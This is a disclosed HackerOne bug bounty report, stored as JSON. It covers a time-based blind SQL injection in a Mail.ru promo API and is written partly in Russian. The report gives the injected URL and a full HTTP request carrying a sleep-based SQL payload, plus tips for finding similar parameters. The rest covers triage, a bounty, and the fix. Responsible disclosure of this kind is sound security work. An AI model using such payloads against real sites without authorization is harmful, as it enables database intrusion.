{"id":786044,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODYwNDQ=","url":"https://hackerone.com/reports/786044","title":"[windows10.hi-tech.mail.ru]  Blind SQL Injection ","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-01-30T10:14:07.534Z","submitted_at":"2020-01-30T10:14:07.534Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"api_0","url":"/api_0","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fNkpoNJ9U4wjowpJtdfzKmEw/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":65,"url":"https://hackerone.com/mailru","handle":"mailru","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Mail.ru","twitter_handle":"mailru","website":"https://corp.mail.ru","about":"Building the Internet since 1998"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-03-10T16:02:24.522Z","bug_reporter_agreed_on_going_public_at":"2020-02-23T18:10:21.280Z","team_member_agreed_on_going_public_at":"2020-03-10T16:02:24.444Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Доброе утро!\nСегодня удалось найти у вас слепую скулю, правда она снова вне скопа походу((\n\nURL:\n```\nhttps://windows10.hi-tech.mail.ru/api/tweets?city_id=(select(0)from(select(sleep(25)))v)\n```\n\nRequest:\n```\nGET /api/tweets?city_id=(select(0)from(select(sleep(25)))v) HTTP/1.1\nHost: windows10.hi-tech.mail.ru\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: V████████\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\nResponse:\n```\nHTTP/1.1 200 OK\nServer: nginx/1.16.1\nDate: Thu, 30 Jan 2020 10:05:07 GMT\nContent-Type: text/json; charset=utf-8\nConnection: close\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nContent-Length: 50\n\n{\"status\":\"ok\",\"last_id\":0,\"data\":[],\"total\":\"0\"}\n```\nProof in screenshots.\nДля воспроизведения - изменяйте временной промежуток. В запросе выше это 25.\n\n## Impact\n\nWithout sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.","vulnerability_information_html":"\u003cp\u003eДоброе утро!\u003cbr\u003e\nСегодня удалось найти у вас слепую скулю, правда она снова вне скопа походу((\u003c/p\u003e\n\n\u003cp\u003eURL:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://windows10.hi-tech.mail.ru/api/tweets?city_id=(select(0)from(select(sleep(25)))v)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRequest:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /api/tweets?city_id=(select(0)from(select(sleep(25)))v) HTTP/1.1\nHost: windows10.hi-tech.mail.ru\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: V████████\nConnection: close\nUpgrade-Insecure-Requests: 1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResponse:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nServer: nginx/1.16.1\nDate: Thu, 30 Jan 2020 10:05:07 GMT\nContent-Type: text/json; charset=utf-8\nConnection: close\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nContent-Length: 50\n\n{\u0026quot;status\u0026quot;:\u0026quot;ok\u0026quot;,\u0026quot;last_id\u0026quot;:0,\u0026quot;data\u0026quot;:[],\u0026quot;total\u0026quot;:\u0026quot;0\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eProof in screenshots.\u003cbr\u003e\nДля воспроизведения - изменяйте временной промежуток. В запросе выше это 25.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eWithout sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.\u003c/p\u003e\n","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-03-24T18:10:21.315Z","allow_singular_disclosure_after":-24151325.438193373,"singular_disclosure_allowed":true,"vote_count":320,"voters":["bleg","krevetk0","a_d_a_m","jackspa22ow","maxarr","spam404","sameerphad72","prophet","renekroka","stealthy","and 310 more..."],"severity":{"rating":"high","score":7.5,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":40418,"asset_type":"OTHER","asset_identifier":"Ext. A Scope","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6919084,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for reporting your bug to Mail.Ru Group! We appreciate your time for helping us to make our web services safer.\n\nYour report have passed an initial review and was assigned to security engineer. Security engineer will contact you only if there are any questions on reproducing the bug or some additional information from you is required. He will manage the patching process. Once the bug is completely fixed, this report is transferred to \"Resolved\" state, it can take some time.","markdown_message":"\u003cp\u003eThank you for reporting your bug to Mail.Ru Group! We appreciate your time for helping us to make our web services safer.\u003c/p\u003e\n\n\u003cp\u003eYour report have passed an initial review and was assigned to security engineer. Security engineer will contact you only if there are any questions on reproducing the bug or some additional information from you is required. He will manage the patching process. Once the bug is completely fixed, this report is transferred to \u0026quot;Resolved\u0026quot; state, it can take some time.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-30T10:20:41.690Z","updated_at":"2020-01-30T10:20:41.690Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6920837,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hello, \n\nbug bounty reward is transferred to your account. You can set payment options and request payout via\nhttps://hackerone.com/settings/bounties\n\nThanks again,\nwaiting for new bug reports from you.\n\nP.S. we are still working to resolve this problem","markdown_message":"\u003cp\u003eHello, \u003c/p\u003e\n\n\u003cp\u003ebug bounty reward is transferred to your account. You can set payment options and request payout via\u003cbr\u003e\n\u003ca title=\"https://hackerone.com/settings/bounties\" href=\"https://hackerone.com/settings/bounties\"\u003ehttps://hackerone.com/settings/bounties\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThanks again,\u003cbr\u003e\nwaiting for new bug reports from you.\u003c/p\u003e\n\n\u003cp\u003eP.S. we are still working to resolve this problem\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-30T14:17:09.238Z","updated_at":"2020-01-30T14:17:09.238Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Mail.ru"}},"bounty_amount":"5000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"mailru","collaborator":{"username":"api_0","url":"/api_0"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6921123,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Это очень щедро. Спасибо большое)","markdown_message":"\u003cp\u003eЭто очень щедро. Спасибо большое)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-30T14:53:28.004Z","updated_at":"2020-01-30T14:53:28.004Z","actor":{"username":"api_0","cleared":false,"url":"/api_0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fNkpoNJ9U4wjowpJtdfzKmEw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6930752,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Привет, бага закрыта.\nПожалуйста, подтверди, что проблема больше не воспроизводится. \n","markdown_message":"\u003cp\u003eПривет, бага закрыта.\u003cbr\u003e\nПожалуйста, подтверди, что проблема больше не воспроизводится. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T11:11:58.974Z","updated_at":"2020-01-31T11:11:58.974Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"api_0","url":"/api_0"},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6932063,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Да, действительно фикс. Воспроизвести не получается. Спасибо)","markdown_message":"\u003cp\u003eДа, действительно фикс. Воспроизвести не получается. Спасибо)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T12:17:09.439Z","updated_at":"2020-01-31T12:17:09.439Z","actor":{"username":"api_0","cleared":false,"url":"/api_0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fNkpoNJ9U4wjowpJtdfzKmEw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7128663,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Здравствуйте. Можем ли мы раскрыть отчет?","markdown_message":"\u003cp\u003eЗдравствуйте. Можем ли мы раскрыть отчет?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-23T18:09:55.000Z","updated_at":"2020-02-23T18:09:55.000Z","actor":{"username":"api_0","cleared":false,"url":"/api_0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fNkpoNJ9U4wjowpJtdfzKmEw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7128665,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-23T18:10:21.298Z","updated_at":"2020-02-23T18:10:21.298Z","first_to_agree":true,"actor":{"username":"api_0","cleared":false,"url":"/api_0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fNkpoNJ9U4wjowpJtdfzKmEw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7142821,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Привет.\nРаскроем в течение нескольких недель.","markdown_message":"\u003cp\u003eПривет.\u003cbr\u003e\nРаскроем в течение нескольких недель.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-25T09:13:41.949Z","updated_at":"2020-02-25T09:13:41.949Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7142921,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Благодарю) \nХорошего дня 😉","markdown_message":"\u003cp\u003eБлагодарю) \u003cbr\u003e\nХорошего дня 😉\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-25T09:17:02.796Z","updated_at":"2020-02-25T09:17:02.796Z","actor":{"username":"api_0","cleared":false,"url":"/api_0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fNkpoNJ9U4wjowpJtdfzKmEw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7280361,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-10T16:00:17.155Z","updated_at":"2020-03-10T16:00:17.155Z","additional_data":{"old_severity":"Critical","new_severity":"High (7.5)","old_severity_id":621284,"new_severity_id":655627},"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7280382,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-10T16:02:24.466Z","updated_at":"2020-03-10T16:02:24.466Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7280383,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-10T16:02:24.547Z","updated_at":"2020-03-10T16:02:24.547Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":20634,"category":"team","content":"Blind (time based) SQL injection in windows10.hi-tech.mail.ru promo page due to insecure use of GET parameter","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eBlind (time based) SQL injection in windows10.hi-tech.mail.ru promo page due to insecure use of GET parameter\u003c/p\u003e\n"},{"id":20672,"category":"researcher","content":"А, нет! Оказалось в скопе)\n\nПроверяйте страницы 403 на наличие уязвимых параметром, которые передаются GET запросом в URL.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eА, нет! Оказалось в скопе)\u003c/p\u003e\n\n\u003cp\u003eПроверяйте страницы 403 на наличие уязвимых параметром, которые передаются GET запросом в URL.\u003c/p\u003e\n"}]}